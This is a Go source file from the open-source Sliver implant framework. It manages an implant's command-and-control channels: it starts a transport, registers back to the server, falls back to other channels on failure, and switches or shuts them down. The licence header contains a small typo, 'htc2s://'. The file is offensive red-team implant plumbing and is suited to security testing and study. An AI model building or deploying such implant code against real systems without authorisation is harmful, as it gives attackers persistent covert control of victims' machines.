package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <htc2s://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"errors"
	"fmt"
	insecureRand "math/rand"
	"net/url"
	"sync"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	StrategyRandom       = "random"
	StrategyRandomDomain = "random-domain"
	StrategySequential   = "sequential"
)

var (
	// ErrMaxAttempts - Passed by transports to the c2 controller
	ErrMaxAttempts = errors.New("reached maximum connection attempts")
)

var (
	// Transports - All active transports on this implant.
	Transports = &channels{
		Available:       []Channel{},
		transportErrors: make(chan error, 1),
		mutex:           &sync.RWMutex{},
	}
)

// channels - Holds all active and loaded/available C2 Channels for this implant runtime.
// This is consumed by some handlers & listeners, as well as the routing system.
type channels struct {
	Available       []Channel     // All C2 channels available (compiled in) to this implant
	Active          Channel       // The transport tied to the C2 server (active connection)
	transportErrors chan error    // When a transport fails, notify the error so we can cycle
	isSwitching     bool          // Notify that we are currently switching the transport.
	counter         int           // A counter to compute the index of a transport in the list
	mutex           *sync.RWMutex // Concurrency
}

// Init - Parses all available transport strings and registers them as available transports.
// Then starts the first transport in the list, for reaching back to the server.
func (c2s *channels) Init() (err error) {

	// Load all available C2 transports into Channels
	for order, profile := range profiles {
		channel, err := InitChannel(profile)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Error igniting C2 Channel: %s", err)
			// {{end}}
			continue
		}
		channel.Transport().Priority = order
		c2s.Add(channel)
	}
	if len(c2s.Available) == 0 {
		return errors.New("no available transports")
	}

	// {{if .Config.Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	// Find the first C2, and attempt to start it
	// or any subsequent until one is successful.
	err = c2s.startTransports()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
		return
	}

	// Start monitoring the transports for any connection errors,
	// and handle them with the appropriate reconnection strategy.
	c2s.serveTransports()

	return
}

// startTransports - Attempts to start the first transport for this program run, and
// exit the function so that we can start monitoring for errors in another goroutine.
func (c2s *channels) startTransports() (err error) {

	// Select the next (first) transport to be
	// started according to the connection strategy
	c2s.selectNextTransport()

	for {
		// Attempt to start the channel
		err = c2s.Active.Start()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Transport failed to start: %s", err)
			// {{end}}

			// Select the next transport to be started
			// according to the connection strategy
			c2s.selectNextTransport()
			continue
		}

		// If correctly started, go serve its handlers
		// (session or beacon handlers) in the background
		go c2s.Active.Serve(c2s.transportErrors)

		// Now send the registration message corresponding
		// to the Channel type, with transport statistics.
		// The Send() call automatically starts a new C2 stack
		// when needed, as is for beacon channels.
		c2s.Active.Send(c2s.Active.Register(c2s.transportStatistics()))

		// {{if .Config.Debug}}
		log.Printf("Transport started (%s)", c2s.Active.Transport().URI.String())
		// {{end}}
		return
	}

	return errors.New("Failed to start one of the available transports")
}

// serveTransports - Monitor and handle errors
// thrown by transports in the background. Blocking.
func (c2s *channels) serveTransports() {

	// Wait for an error to be thrown by a transport
	for err := range c2s.transportErrors {
		current := c2s.Active

		// Known/Ignored Errors ----------------------------------------------------------
		if err == nil {
			// {{if .Config.Debug}}
			log.Printf("(Transports) NIL ERROR ")
			// {{end}}
			continue
		}

		// Do not do anything if we are currently
		// tasked to switch the transport
		if c2s.isSwitching {
			// {{if .Config.Debug}}
			log.Printf("(Transports)[Switching] Ignoring error: %s", err)
			// {{end}}
			continue
		}

		// If beacon, errors are constantly being thrown because closing connections
		// will performing blocking reading operations will always return an error.
		// We only care about if not maximum attempts reached
		if current.Transport().Type == sliverpb.C2Type_Beacon && err != ErrMaxAttempts {
			// {{if .Config.Debug}}
			log.Printf("(Transports)[Beacon] Ignoring error: %s", err)
			// {{end}}
			continue
		}

		// Unknown Errors to handle --------------------------------------------------------

		// {{if .Config.Debug}}
		log.Printf("Active transport (%s) thrown an error: %s", current.Transport().ID, err)
		// {{end}}

		// Always check if all transports haven't reach their max attempts.
		// If yes return, this will shutdown the whole implant.
		if c2s.transportsExhausted() {
			break
		}

		// Select the next transport according to the specified connection strategy,
		// and make it immediately as the Server transport, so we can cleanup if it fails.
		c2s.selectNextTransport()
		current = c2s.Active // Re-reference for below

		// And start it, sending any error back to this routine for cleanup
		// This start will also take into account any reconnect intervals, even
		// before the first run/call in the case of beacons.
		err = current.Start()
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("Transport failed to start: %s", err)
			// {{end}}
			c2s.transportErrors <- err // The transportErrors chan is buffered with one slot
			continue
		}

		// If correctly started, go serve its handlers
		// (session or beacon handlers) in the background
		go current.Serve(c2s.transportErrors)

		// Now send the registration message corresponding
		// to the Channel type, with transport statistics.
		current.Send(current.Register(c2s.transportStatistics()))

		// {{if .Config.Debug}}
		log.Printf("Successful transport fallback (%s): %s", current.Transport().ID, current.Transport().URI.String())
		// {{end}}
	}

	// {{if .Config.Debug}}
	log.Printf("All transports have exhausted their allowed number of connection attempts")
	log.Printf("Exiting")
	// {{end}}
}

// transportsExhausted - Checks whether at least one of the available
// transports has not reached its maximum of connection attempts allowed.
// We don't care which one, the implant will automatically cycle to it.
func (c2s *channels) transportsExhausted() bool {
	for _, transport := range c2s.Available {
		_, failures := transport.Transport().Statistics()
		if failures < int(transport.Transport().MaxConnectionErrors) {
			return false
		}
	}
	return true
}

// selectNextTransport - Get the next transport
// according to the implant connection strategy.
func (c2s *channels) selectNextTransport() (next Channel) {
	switch "{{.Config.ConnectionStrategy}}" {

	// Random C2 with any protocol
	case StrategyRandom:
		next = c2s.Available[insecureRand.Intn(len(c2s.Available))]

	// Random C2 with the same protocol
	case StrategyRandomDomain:
		next = c2s.Available[insecureRand.Intn(len(c2s.Available))]
		next = c2s.randomCCDomain(next.Transport().URI)

	// Next C2 in order of loading
	case StrategySequential:
		next = c2s.Available[c2s.counter%len(c2s.Available)]
	default:
		next = c2s.Available[c2s.counter%len(c2s.Available)]
	}

	// Set the transport
	c2s.mutex.RLock()
	c2s.counter++
	c2s.Active = next
	c2s.mutex.RUnlock()

	return
}

// randomCCDomain - Random selection within a protocol
func (c2s *channels) randomCCDomain(uri *url.URL) Channel {
	pool := []Channel{}
	protocol := uri.Scheme
	for _, cc := range c2s.Available {
		if uri.Scheme == protocol {
			pool = append(pool, cc)
		}
	}
	return pool[insecureRand.Intn(len(pool))]
}

// Transports statistics
func (c2s *channels) transportStatistics() []*sliverpb.Transport {
	stats := []*sliverpb.Transport{}
	for order, tp := range Transports.Available {
		attempts, failures := tp.Transport().Statistics()

		transport := &sliverpb.Transport{
			ID:       tp.Transport().ID,
			Order:    int32(order),
			Running:  tp.Profile().Active,
			Attempts: int32(attempts),
			Failures: int32(failures),
			// No profile, we have it server-side
		}
		stats = append(stats, transport)
	}
	return stats
}

// Add - Add a new active transport to the implant' transport map.
func (c2s *channels) Add(ch Channel) (err error) {
	c2s.mutex.Lock()
	defer c2s.mutex.Unlock()
	c2 := ch.Transport()

	// Use the computer normal priority value when touching the list
	priority := c2.Priority

	// If the priority is too high, bring it to last
	if priority > len(c2s.Available) {
		c2.Priority = len(c2s.Available) + 1
		c2s.Available = append(c2s.Available, ch)

		// If priority is within the range, insert at requested order
	} else if priority < len(c2s.Available) && priority >= 0 {
		following := append([]Channel{ch}, c2s.Available[priority:]...)
		c2s.Available = append(c2s.Available[:priority], following...)

		// If the priority is just the last one, append
	} else if priority == len(c2s.Available) {
		c2s.Available = append(c2s.Available, ch)
	}

	return
}

// Remove - A transport has terminated its connection, and we remove it.
func (c2s *channels) Remove(ID string) (err error) {
	c2s.mutex.Lock()
	defer c2s.mutex.Unlock()
	for i, c2 := range c2s.Available {
		if c2.Transport().ID == ID {
			c2s.Available = append(c2s.Available[:i], c2s.Available[i+1:]...)
		}
	}
	// delete(t.Available, ID)
	return
}

// Get - Returns an active C2 given an ID.
func (c2s *channels) Get(ID string) (c2 Channel) {
	for _, transport := range c2s.Available {
		if transport.Transport().ID == ID {
			return transport
		}
	}
	return
}

// Switch - Dynamically switch the active transport, if multiple are available.
// This function always attempts to start the next transport, and if fails to do
// so, will not stop the old transport, and will send failure notification through it.
func (c2s *channels) Switch(ID string) (err error) {

	// Get the transport and reset its attempts
	var next = Transports.Get(ID)
	if next == nil {
		return fmt.Errorf("could not find transport with ID %s", ID)
	}

	c2s.mutex.RLock()
	c2s.isSwitching = true
	c2s.mutex.RUnlock()

	// {{if .Config.Debug}}
	log.Printf("Switching the current transport: %s", c2s.Active.Transport().ID)
	log.Printf("New transport: %s", next.Transport().ID)
	// {{end}}

	// Keep the current transport ID, needed when registering
	// again to the server, for identification purposes.
	oldTransportID := c2s.Active.Transport().ID

	// And start it, sending any error back to this routine for cleanup
	// This start will also take into account any reconnect intervals, even
	// before the first run/call in the case of beacons.
	err = next.Start()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("(Switch) Failed to start new transport: %s", err)
		// {{end}}
		c2s.mutex.RLock()
		c2s.isSwitching = false
		c2s.mutex.RUnlock()

		// Send a transport registration marked failed, with updated stats.
		// The failure is noticed because we sent the ID of the current
		// transport instead of the one we were supposed to start successfully.
		next.Send(next.RegisterSwitch(oldTransportID, c2s.transportStatistics()))
		return
	}

	// If correctly started, go serve its handlers
	// (session or beacon handlers) in the background
	go next.Serve(c2s.transportErrors)

	// Now send the registration message corresponding
	// to the Channel type, with transport statistics.
	next.Send(next.Register(c2s.transportStatistics()))

	// Now that everything is done, shutdown the old transport
	err = c2s.Active.Close()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf(err.Error())
		// {{end}}
	}

	// And assign the new one as current
	c2s.mutex.RLock()
	c2s.Active = next
	c2s.isSwitching = false
	c2s.mutex.RUnlock()

	// {{if .Config.Debug}}
	log.Printf("Done switching transport: %s", c2s.Active.Transport().ID)
	// {{end}}

	return nil
}

// SetActiveC2 - Marks the passed C2 Channel as active
func (c2s *channels) SetActiveC2(transport Channel) {
	c2s.mutex.RLock()
	defer c2s.mutex.RUnlock()
	for _, loaded := range c2s.Available {
		if loaded.Transport().ID == transport.Transport().ID {
			loaded.Transport().Active = true
		}
	}
}

// Shutdown - Close all availables transports. If the exit parameter is true
// the transports will close their waiter, which will release the main function
// of this implant program. Normally, this is set true when the kill command
// is received, but not for the "disconnect" command (because we just sleep for this one)
func (c2s *channels) Shutdown() (err error) {

	// Close the server transport
	err = c2s.Active.Close()

	return
}
